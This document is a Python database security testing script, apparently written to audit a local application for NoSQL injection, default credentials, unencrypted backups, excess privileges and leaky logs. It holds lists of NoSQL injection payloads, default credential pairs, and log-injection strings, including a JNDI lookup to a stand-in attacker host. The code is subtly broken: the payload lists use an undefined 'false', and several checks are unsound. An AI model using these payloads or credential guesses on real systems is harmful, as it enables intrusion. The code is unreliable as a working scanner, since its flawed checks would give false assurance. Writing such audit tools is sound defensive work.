#!/usr/bin/env python3
"""
Comprehensive Database Security Testing Suite
Tests for NoSQL injection, credential rotation, backup encryption, privilege escalation, and log security
"""

import asyncio
import aiohttp
import json
import re
import base64
import hashlib
import os
import sys
import subprocess
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
import pymongo
from motor.motor_asyncio import AsyncIOMotorClient
import asyncpg
import redis.asyncio as redis
from dataclasses import dataclass
from enum import Enum

class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"

@dataclass
class SecurityFinding:
    category: str
    severity: Severity
    title: str
    description: str
    evidence: str
    recommendation: str
    cve_id: Optional[str] = None
    cvss_score: Optional[float] = None

class DatabaseSecurityTester:
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.findings: List[SecurityFinding] = []
        self.session = None
        self.setup_logging()

        # Database connections
        self.mongo_client = None
        self.postgres_conn = None
        self.redis_client = None

    def setup_logging(self):
        """Setup detailed logging for security testing"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('database_security_test.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger('DBSecurityTester')

    async def setup_connections(self):
        """Initialize database connections for testing"""
        try:
            # MongoDB connection
            if 'mongodb' in self.config:
                mongo_config = self.config['mongodb']
                self.mongo_client = AsyncIOMotorClient(
                    f"mongodb://{mongo_config['host']}:{mongo_config['port']}",
                    username=mongo_config.get('username'),
                    password=mongo_config.get('password'),
                    authSource=mongo_config.get('authDatabase', 'admin')
                )
                await self.mongo_client.admin.command('ping')
                self.logger.info("✅ MongoDB connection established")

            # PostgreSQL connection
            if 'postgresql' in self.config:
                pg_config = self.config['postgresql']
                self.postgres_conn = await asyncpg.connect(
                    host=pg_config['host'],
                    port=pg_config['port'],
                    user=pg_config.get('username'),
                    password=pg_config.get('password'),
                    database=pg_config.get('database')
                )
                self.logger.info("✅ PostgreSQL connection established")

            # Redis connection
            if 'redis' in self.config:
                redis_config = self.config['redis']
                self.redis_client = redis.Redis(
                    host=redis_config['host'],
                    port=redis_config['port'],
                    password=redis_config.get('password'),
                    decode_responses=True
                )
                await self.redis_client.ping()
                self.logger.info("✅ Redis connection established")

        except Exception as e:
            self.logger.error(f"❌ Failed to establish database connections: {str(e)}")
            raise

    async def add_finding(self, category: str, severity: Severity, title: str,
                         description: str, evidence: str, recommendation: str):
        """Add a security finding to the report"""
        finding = SecurityFinding(
            category=category,
            severity=severity,
            title=title,
            description=description,
            evidence=evidence,
            recommendation=recommendation
        )
        self.findings.append(finding)
        self.logger.warning(f"[{severity.value}] {title}: {description}")

    # ==================== NoSQL Injection Testing ====================

    async def test_nosql_injection(self):
        """Test for NoSQL injection vulnerabilities"""
        self.logger.info("🔍 Testing NoSQL injection vulnerabilities...")

        nosql_payloads = [
            # Basic injection payloads
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "return true"},
            {"$or": [{"1": "1"}]},

            # Advanced injection payloads
            {"$expr": {"$eq": ["$password", "$password"]}},
            {"$jsonSchema": {"required": []}},
            {"$not": {"$eq": ["$password", ""]}},

            # MongoDB operator injection
            {"$in": ["admin", "user", "root"]},
            {"$exists": True},
            {"$type": "string"},

            # Function injection
            {"$function": {"body": "function() { return true; }", "args": []}},

            # JavaScript injection
            {"$where": "function() { return true; }"},
            {"$where": "this.password == this.password"},

            # Array-based injection
            {"$in": ["", None, 0, false]},
            {"$nin": ["", None, 0, false]},
        ]

        # Test API endpoints for NoSQL injection
        await self.test_api_nosql_injection(nosql_payloads)

        # Test direct database queries
        if self.mongo_client:
            await self.test_mongodb_nosql_injection(nosql_payloads)

    async def test_api_nosql_injection(self, payloads: List[Dict]):
        """Test API endpoints for NoSQL injection"""
        api_endpoints = [
            "/api/v1/users",
            "/api/v1/assessments",
            "/api/v1/responses",
            "/api/v1/analytics"
        ]

        base_url = self.config.get('api_base_url', 'http://localhost:8000')

        async with aiohttp.ClientSession() as session:
            for endpoint in api_endpoints:
                for payload in payloads:
                    try:
                        # Test in query parameters
                        params = {"filter": json.dumps(payload)}
                        async with session.get(f"{base_url}{endpoint}", params=params) as response:
                            if response.status == 200:
                                data = await response.json()
                                if self.detect_nosql_success(data, payload):
                                    await self.add_finding(
                                        "NoSQL Injection",
                                        Severity.HIGH,
                                        f"NoSQL injection in {endpoint} (query parameter)",
                                        f"API endpoint vulnerable to NoSQL injection via query parameters",
                                        f"Payload: {json.dumps(payload)}",
                                        "Implement input validation and use parameterized queries"
                                    )

                        # Test in POST body
                        post_data = {"filter": payload}
                        async with session.post(f"{base_url}{endpoint}", json=post_data) as response:
                            if response.status == 200:
                                data = await response.json()
                                if self.detect_nosql_success(data, payload):
                                    await self.add_finding(
                                        "NoSQL Injection",
                                        Severity.HIGH,
                                        f"NoSQL injection in {endpoint} (POST body)",
                                        f"API endpoint vulnerable to NoSQL injection via POST body",
                                        f"Payload: {json.dumps(payload)}",
                                        "Implement input validation and use parameterized queries"
                                    )

                    except Exception as e:
                        self.logger.debug(f"Error testing {endpoint} with payload {payload}: {str(e)}")

    def detect_nosql_success(self, response_data: Any, payload: Dict) -> bool:
        """Detect if NoSQL injection was successful"""
        if not isinstance(response_data, dict):
            return False

        # Check for unusual data amounts
        if 'data' in response_data and len(response_data['data']) > 1000:
            return True

        # Check for bypassed authentication
        if any(key in response_data for key in ['users', 'passwords', 'secrets']):
            return True

        # Check for system information disclosure
        if any(key in str(response_data).lower() for key in ['system', 'admin', 'root', 'database']):
            return True

        return False

    async def test_mongodb_nosql_injection(self, payloads: List[Dict]):
        """Test MongoDB directly for NoSQL injection"""
        try:
            db = self.mongo_client.testdb
            collection = db.testcollection

            # Test injection in find operations
            for payload in payloads:
                try:
                    result = await collection.find(payload).to_list(length=10)
                    if len(result) > 0:
                        await self.add_finding(
                            "NoSQL Injection",
                            Severity.CRITICAL,
                            "MongoDB NoSQL injection vulnerability",
                            "Direct MongoDB query accepts injection payloads",
                            f"Payload returned {len(result)} documents: {json.dumps(payload)}",
                            "Implement input validation and use secure query methods"
                        )
                        break
                except Exception as e:
                    # Expected for some payloads, but log for analysis
                    pass

        except Exception as e:
            self.logger.error(f"Error testing MongoDB NoSQL injection: {str(e)}")

    # ==================== Credential Rotation Testing ====================

    async def test_credential_rotation(self):
        """Test database credential rotation policies"""
        self.logger.info("🔍 Testing database credential rotation...")

        await self.check_credential_age()
        await self.test_default_credentials()
        await self.check_credential_strength()
        await self.verify_rotation_mechanisms()

    async def check_credential_age(self):
        """Check age of database credentials"""
        try:
            # Check PostgreSQL credential age
            if self.postgres_conn:
                query = """
                SELECT usename, passwd, valuntil
                FROM pg_shadow
                WHERE valuntil IS NOT NULL AND valuntil < NOW()
                """

                try:
                    result = await self.postgres_conn.fetch(query)
                    if result:
                        for row in result:
                            await self.add_finding(
                                "Credential Management",
                                Severity.HIGH,
                                "Expired database credentials detected",
                                f"PostgreSQL user '{row['usename']}' has expired credentials",
                                f"User: {row['usename']}, Expires: {row['valuntil']}",
                                "Rotate expired credentials immediately"
                            )
                except Exception as e:
                    # May not have privileges to query pg_shadow
                    pass

            # Check for hardcoded credentials in codebase
            await self.scan_for_hardcoded_credentials()

        except Exception as e:
            self.logger.error(f"Error checking credential age: {str(e)}")

    async def scan_for_hardcoded_credentials(self):
        """Scan codebase for hardcoded database credentials"""
        sensitive_files = [
            ".env", ".env.prod", ".env.dev",
            "config.py", "database.py", "settings.py",
            "docker-compose.yml", "docker-compose.prod.yml"
        ]

        sensitive_patterns = [
            r'password\s*=\s*["\'][^"\']{8,}["\']',
            r'secret_key\s*=\s*["\'][^"\']{16,}["\']',
            r'mongodb://[^:]+:[^@]+@',
            r'postgres://[^:]+:[^@]+@',
            r'DB_PASSWORD\s*=\s*["\'][^"\']+["\']',
        ]

        for file_path in sensitive_files:
            if os.path.exists(file_path):
                try:
                    with open(file_path, 'r') as f:
                        content = f.read()

                    for pattern in sensitive_patterns:
                        matches = re.finditer(pattern, content, re.IGNORECASE)
                        for match in matches:
                            await self.add_finding(
                                "Credential Management",
                                Severity.CRITICAL,
                                f"Hardcoded credentials in {file_path}",
                                f"Sensitive credentials found in configuration file",
                                f"Pattern matched: {match.group()}",
                                "Use environment variables or secret management instead of hardcoded credentials"
                            )

                except Exception as e:
                    self.logger.debug(f"Error scanning {file_path}: {str(e)}")

    async def test_default_credentials(self):
        """Test for default database credentials"""
        default_credentials = [
            # MongoDB defaults
            {"username": "admin", "password": "admin"},
            {"username": "root", "password": "root"},
            {"username": "mongodb", "password": "mongodb"},

            # PostgreSQL defaults
            {"username": "postgres", "password": "postgres"},
            {"username": "admin", "password": "admin"},
            {"username": "root", "password": "root"},

            # Redis defaults
            {"password": None},  # No password
            {"password": "redis"},
            {"password": "foobared"},
        ]

        # Test MongoDB defaults
        if 'mongodb' in self.config:
            mongo_config = self.config['mongodb']
            for cred in default_credentials:
                try:
                    test_client = AsyncIOMotorClient(
                        f"mongodb://{mongo_config['host']}:{mongo_config['port']}",
                        username=cred.get('username'),
                        password=cred.get('password'),
                        serverSelectionTimeoutMS=2000
                    )
                    await test_client.admin.command('ping')

                    await self.add_finding(
                        "Credential Management",
                        Severity.CRITICAL,
                        "Default database credentials work",
                        f"MongoDB accepts default credentials",
                        f"Username: {cred.get('username', 'None')}, Password: {cred.get('password', 'None')}",
                        "Change default credentials immediately"
                    )
                    test_client.close()
                    break

                except Exception:
                    pass

    async def check_credential_strength(self):
        """Check strength of database credentials"""
        weak_passwords = [
            "password", "123456", "admin", "root", "test",
            "guest", "user", "pass", "qwerty", "password123"
        ]

        # This would need access to hashed passwords or auditing system
        # Implementation depends on database type and configuration
        self.logger.info("ℹ️  Credential strength checking requires database audit logs")

    async def verify_rotation_mechanisms(self):
        """Verify that credential rotation mechanisms exist"""
        rotation_indicators = [
            "credential_rotation.py",
            "rotate_credentials.sh",
            "password_policy.json",
            "rotation_schedule.py"
        ]

        found_rotation = False
        for indicator in rotation_indicators:
            if os.path.exists(indicator):
                found_rotation = True
                break

        if not found_rotation:
            await self.add_finding(
                "Credential Management",
                Severity.MEDIUM,
                "No credential rotation mechanism found",
                "No automated credential rotation system detected",
                "No rotation scripts or policies found",
                "Implement automated credential rotation with regular schedule"
            )

    # ==================== Backup Encryption Testing ====================

    async def test_backup_encryption(self):
        """Test database backup encryption"""
        self.logger.info("🔍 Testing database backup encryption...")

        await self.check_backup_files()
        await self.test_backup_processes()
        await self.verify_encryption_standards()

    async def check_backup_files(self):
        """Check existing backup files for encryption"""
        backup_directories = [
            "./backups", "/var/backups", "/tmp/backups",
            "./db_backups", "./sql_dumps", "./mongodumps"
        ]

        for backup_dir in backup_directories:
            if os.path.exists(backup_dir):
                for root, dirs, files in os.walk(backup_dir):
                    for file in files:
                        if file.endswith(('.sql', '.dump', '.backup', '.bak')):
                            file_path = os.path.join(root, file)

                            # Check if file is encrypted
                            if await self.is_file_encrypted(file_path):
                                self.logger.info(f"✅ Encrypted backup found: {file_path}")
                            else:
                                await self.add_finding(
                                    "Backup Security",
                                    Severity.HIGH,
                                    f"Unencrypted backup file found: {file_path}",
                                    "Database backup file is not encrypted",
                                    f"File: {file_path}, Size: {os.path.getsize(file_path)} bytes",
                                    "Encrypt all database backups using AES-256 or stronger"
                                )

    async def is_file_encrypted(self, file_path: str) -> bool:
        """Check if a file is encrypted"""
        try:
            with open(file_path, 'rb') as f:
                header = f.read(1024)

            # Check for common encrypted file signatures
            encrypted_signatures = [
                b'salted__',  # OpenSSL
                b'-----BEGIN',  # PEM/PGP
                b'\x89PNG\r\n\x1a\n',  # PNG (shouldn't be in SQL backup)
                b'PK\x03\x04',  # ZIP
            ]

            # Check for plaintext SQL indicators
            plaintext_indicators = [
                b'CREATE TABLE',
                b'INSERT INTO',
                b'-- MySQL dump',
                b'-- PostgreSQL dump',
                b'{ "_id":',  # MongoDB
            ]

            if any(sig in header for sig in encrypted_signatures):
                return True

            if any(ind in header for ind in plaintext_indicators):
                return False

            # Check for high entropy (indicates encryption)
            if len(set(header)) / len(header) > 0.95:  # High entropy
                return True

        except Exception:
            pass

        return False

    async def test_backup_processes(self):
        """Test backup creation processes"""
        backup_processes = [
            "pg_dump", "mysqldump", "mongodump",
            "pg_basebackup", "mysqldump", "sqlite3"
        ]

        # Check running processes for backup commands
        try:
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            processes = result.stdout.lower()

            for process in backup_processes:
                if process in processes:
                    # Check if encryption flags are used
                    if '--encrypt' not in processes and '-e' not in processes:
                        await self.add_finding(
                            "Backup Security",
                            Severity.MEDIUM,
                            f"Unencrypted backup process running: {process}",
                            "Backup process detected without encryption flags",
                            f"Process: {process}",
                            "Add encryption flags to backup commands"
                        )

        except Exception as e:
            self.logger.debug(f"Error checking backup processes: {str(e)}")

    async def verify_encryption_standards(self):
        """Verify encryption standards compliance"""
        required_standards = [
            "AES-256",
            "TLS 1.2+",
            "FIPS 140-2"
        ]

        # This would typically check configuration files
        self.logger.info("ℹ️  Encryption standards verification requires access to configuration files")

    # ==================== Privilege Escalation Testing ====================

    async def test_privilege_escalation(self):
        """Test for database privilege escalation vulnerabilities"""
        self.logger.info("🔍 Testing database privilege escalation...")

        if self.postgres_conn:
            await self.test_postgresql_privilege_escalation()

        if self.mongo_client:
            await self.test_mongodb_privilege_escalation()

        await self.test_role_configuration()

    async def test_postgresql_privilege_escalation(self):
        """Test PostgreSQL privilege escalation"""
        try:
            # Test for dangerous privileges
            dangerous_queries = [
                ("Superuser check", "SELECT rolsuper FROM pg_roles WHERE rolname = current_user;"),
                ("Create role check", "SELECT rolcreaterole FROM pg_roles WHERE rolname = current_user;"),
                ("Create DB check", "SELECT rolcreatedb FROM pg_roles WHERE rolname = current_user;"),
                ("Execute check", "SELECT rolinherit FROM pg_roles WHERE rolname = current_user;"),
            ]

            for desc, query in dangerous_queries:
                try:
                    result = await self.postgres_conn.fetchrow(query)
                    if result and list(result.values())[0]:
                        await self.add_finding(
                            "Privilege Escalation",
                            Severity.HIGH,
                            f"Dangerous PostgreSQL privilege: {desc}",
                            f"Current user has potentially dangerous privilege",
                            f"Query result: {result}",
                            "Review and minimize database user privileges"
                        )
                except Exception as e:
                    # May not have permissions, which is good
                    pass

            # Test for default privileges
            try:
                result = await self.postgres_conn.fetchrow(
                    "SELECT has_database_privilege(current_user, current_database(), 'CREATE');"
                )
                if result and list(result.values())[0]:
                    await self.add_finding(
                        "Privilege Escalation",
                        Severity.MEDIUM,
                        "User has CREATE privilege on database",
                        "Database user can create new objects",
                        f"User can create objects in {await self.postgres_conn.fetchval('SELECT current_database()')}",
                        "Restrict CREATE privileges to necessary users only"
                    )
            except Exception:
                pass

        except Exception as e:
            self.logger.error(f"Error testing PostgreSQL privilege escalation: {str(e)}")

    async def test_mongodb_privilege_escalation(self):
        """Test MongoDB privilege escalation"""
        try:
            db = self.mongo_client.admin

            # Check current user privileges
            try:
                user_info = await db.command('usersInfo')
                for user in user_info.get('users', []):
                    roles = user.get('roles', [])

                    # Check for dangerous roles
                    dangerous_roles = ['root', 'dbAdminAnyDatabase', 'userAdminAnyDatabase']
                    for role in roles:
                        if role.get('role') in dangerous_roles:
                            await self.add_finding(
                                "Privilege Escalation",
                                Severity.HIGH,
                                f"Dangerous MongoDB role assigned: {role.get('role')}",
                                f"User '{user.get('user')}' has excessive privileges",
                                f"Role: {role.get('role')}, DB: {role.get('db')}",
                                "Use principle of least privilege for database roles"
                            )
            except Exception:
                pass

            # Test for authentication bypass
            try:
                # Try to access admin database without auth
                test_client = AsyncIOMotorClient(
                    f"mongodb://{self.config['mongodb']['host']}:{self.config['mongodb']['port']}",
                    serverSelectionTimeoutMS=2000
                )
                await test_client.admin.command('listCollections')

                await self.add_finding(
                    "Privilege Escalation",
                    Severity.CRITICAL,
                    "MongoDB authentication bypass possible",
                    "Can access admin database without authentication",
                    "Successfully connected without credentials",
                    "Enable authentication for MongoDB"
                )
                test_client.close()

            except Exception:
                # This is expected - authentication should be required
                pass

        except Exception as e:
            self.logger.error(f"Error testing MongoDB privilege escalation: {str(e)}")

    async def test_role_configuration(self):
        """Test role configuration and privilege assignment"""
        # This would check role-based access control configuration
        self.logger.info("ℹ️  Role configuration testing requires access to security policies")

    # ==================== Log Security Testing ====================

    async def test_log_security(self):
        """Test log files for sensitive data exposure"""
        self.logger.info("🔍 Testing log security...")

        await self.scan_log_files()
        await self.check_log_permissions()
        await self.test_log_injection()
        await self.verify_log_retention()

    async def scan_log_files(self):
        """Scan log files for sensitive data"""
        log_directories = [
            "./logs", "/var/log", "./app/logs",
            ".",  # Current directory
        ]

        sensitive_patterns = [
            # PII patterns
            r'\b\d{3}-\d{2}-\d{4}\b',  # SSN
            r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b',  # Credit card
            r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email

            # Password/API key patterns
            r'password["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
            r'api_key["\']?\s*[:=]\s*["\'][A-Za-z0-9]{20,}["\']',
            r'secret["\']?\s*[:=]\s*["\'][^"\']{16,}["\']',
            r'token["\']?\s*[:=]\s*["\'][A-Za-z0-9._-]{20,}["\']',

            # Database connection strings
            r'mongodb://[^@]+:[^@]+@',
            r'postgres://[^@]+:[^@]+@',
            r'mysql://[^@]+:[^@]+@',

            # SQL injection attempts
            r'(union|select|insert|update|delete|drop|create|alter)\s+',

            # System paths
            r'/(?:home|etc|var|usr)/[^/\s]+',
        ]

        for log_dir in log_directories:
            if os.path.exists(log_dir):
                for root, dirs, files in os.walk(log_dir):
                    for file in files:
                        if file.endswith(('.log', '.out', '.err', '.txt')):
                            file_path = os.path.join(root, file)

                            try:
                                with open(file_path, 'r', errors='ignore') as f:
                                    content = f.read(1024 * 1024)  # Read first 1MB

                                for pattern in sensitive_patterns:
                                    matches = re.finditer(pattern, content, re.IGNORECASE)
                                    for match in matches:
                                        # Mask sensitive data in evidence
                                        masked_match = match.group()[:10] + "***" if len(match.group()) > 10 else match.group()

                                        await self.add_finding(
                                            "Log Security",
                                            Severity.HIGH,
                                            f"Sensitive data in log file: {file_path}",
                                            f"Log file contains sensitive information",
                                            f"Pattern matched: {pattern}, Sample: {masked_match}",
                                            "Sanitize logs and avoid logging sensitive data"
                                        )

                            except Exception as e:
                                self.logger.debug(f"Error scanning {file_path}: {str(e)}")

    async def check_log_permissions(self):
        """Check log file permissions"""
        log_files = [
            "./logs/app.log",
            "./logs/error.log",
            "./logs/access.log",
            "./database.log",
            "./postgresql.log",
        ]

        for log_file in log_files:
            if os.path.exists(log_file):
                try:
                    stat_info = os.stat(log_file)
                    mode = oct(stat_info.st_mode)[-3:]

                    # Check if world-readable
                    if mode[2] in ['4', '5', '6', '7']:  # Others have read permission
                        await self.add_finding(
                            "Log Security",
                            Severity.MEDIUM,
                            f"Log file has overly permissive permissions: {log_file}",
                            f"Log file is readable by all users",
                            f"Permissions: {mode}",
                            "Restrict log file permissions to root/application user only"
                        )

                except Exception as e:
                    self.logger.debug(f"Error checking permissions for {log_file}: {str(e)}")

    async def test_log_injection(self):
        """Test for log injection vulnerabilities"""
        injection_payloads = [
            "\n[CRITICAL] System breach detected",
            "\r\n[ERROR] Database connection failed",
            "\x0a[ALERT] Security violation",
            "[<script>alert('xss')</script>]",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "%{#context.stop()}",
        ]

        # Test injection in application logs
        base_url = self.config.get('api_base_url', 'http://localhost:8000')

        async with aiohttp.ClientSession() as session:
            for payload in injection_payloads:
                try:
                    # Test in user input fields
                    test_data = {
                        "username": f"testuser{payload}",
                        "email": f"test{payload}@example.com",
                        "message": payload
                    }

                    async with session.post(f"{base_url}/api/v1/users", json=test_data) as response:
                        if response.status in [200, 201, 400]:  # Request was processed
                            # Check logs for injection
                            await self.check_logs_for_injection(payload)

                except Exception as e:
                    self.logger.debug(f"Error testing log injection with payload {payload}: {str(e)}")

    async def check_logs_for_injection(self, payload: str):
        """Check if injection payload appears in logs"""
        # This would need access to real-time log monitoring
        self.logger.info(f"ℹ️  Log injection verification for payload: {payload[:20]}...")

    async def verify_log_retention(self):
        """Verify log retention policies"""
        retention_policies = {
            "access_logs": 90,  # days
            "error_logs": 365,
            "audit_logs": 2555,  # 7 years for compliance
            "debug_logs": 30,
        }

        # Check if old log files exist beyond retention period
        self.logger.info("ℹ️  Log retention verification requires historical log analysis")

    # ==================== Report Generation ====================

    async def generate_report(self) -> Dict[str, Any]:
        """Generate comprehensive security report"""
        self.logger.info("📋 Generating security report...")

        report = {
            "scan_date": datetime.utcnow().isoformat(),
            "scanner_version": "1.0.0",
            "findings": [],
            "summary": {},
            "recommendations": []
        }

        # Categorize findings
        findings_by_severity = {
            Severity.CRITICAL: [],
            Severity.HIGH: [],
            Severity.MEDIUM: [],
            Severity.LOW: [],
            Severity.INFO: []
        }

        for finding in self.findings:
            finding_dict = {
                "category": finding.category,
                "severity": finding.severity.value,
                "title": finding.title,
                "description": finding.description,
                "evidence": finding.evidence,
                "recommendation": finding.recommendation
            }

            findings_by_severity[finding.severity].append(finding_dict)
            report["findings"].append(finding_dict)

        # Generate summary
        report["summary"] = {
            "total_findings": len(self.findings),
            "critical_findings": len(findings_by_severity[Severity.CRITICAL]),
            "high_findings": len(findings_by_severity[Severity.HIGH]),
            "medium_findings": len(findings_by_severity[Severity.MEDIUM]),
            "low_findings": len(findings_by_severity[Severity.LOW]),
            "info_findings": len(findings_by_severity[Severity.INFO])
        }

        # Generate overall recommendations
        if findings_by_severity[Severity.CRITICAL]:
            report["recommendations"].append("IMMEDIATE ACTION REQUIRED: Address all CRITICAL findings immediately")
        if findings_by_severity[Severity.HIGH]:
            report["recommendations"].append("URGENT: Address all HIGH findings within 24-48 hours")
        if findings_by_severity[Severity.MEDIUM]:
            report["recommendations"].append("Plan: Address MEDIUM findings within 1-2 weeks")

        # Save report
        report_file = f"database_security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2, default=str)

        self.logger.info(f"✅ Security report saved to: {report_file}")
        return report

    async def cleanup(self):
        """Cleanup database connections"""
        if self.mongo_client:
            self.mongo_client.close()
        if self.postgres_conn:
            await self.postgres_conn.close()
        if self.redis_client:
            await self.redis_client.close()

# ==================== Main Execution ====================

async def main():
    """Main execution function"""
    config = {
        "api_base_url": "http://localhost:8000",
        "mongodb": {
            "host": "localhost",
            "port": 27017,
            "username": os.getenv("MONGO_USERNAME"),
            "password": os.getenv("MONGO_PASSWORD"),
            "authDatabase": "admin"
        },
        "postgresql": {
            "host": "localhost",
            "port": 5432,
            "database": "psychsync",
            "username": os.getenv("DB_USER"),
            "password": os.getenv("DB_PASSWORD")
        },
        "redis": {
            "host": "localhost",
            "port": 6379,
            "password": os.getenv("REDIS_PASSWORD")
        }
    }

    tester = DatabaseSecurityTester(config)

    try:
        await tester.setup_connections()

        # Run all security tests
        await tester.test_nosql_injection()
        await tester.test_credential_rotation()
        await tester.test_backup_encryption()
        await tester.test_privilege_escalation()
        await tester.test_log_security()

        # Generate and display report
        report = await tester.generate_report()

        # Print summary
        print(f"\n🔍 Database Security Scan Complete")
        print(f"📊 Total Findings: {report['summary']['total_findings']}")
        print(f"🚨 Critical: {report['summary']['critical_findings']}")
        print(f"⚠️  High: {report['summary']['high_findings']}")
        print(f"⚡ Medium: {report['summary']['medium_findings']}")
        print(f"ℹ️  Low: {report['summary']['low_findings']}")

        if report['summary']['critical_findings'] > 0 or report['summary']['high_findings'] > 0:
            print(f"\n🚨 IMMEDIATE ATTENTION REQUIRED!")
            for rec in report['recommendations']:
                print(f"• {rec}")

    except Exception as e:
        print(f"❌ Error during security testing: {str(e)}")
        import traceback
        traceback.print_exc()
    finally:
        await tester.cleanup()

if __name__ == "__main__":
    asyncio.run(main())
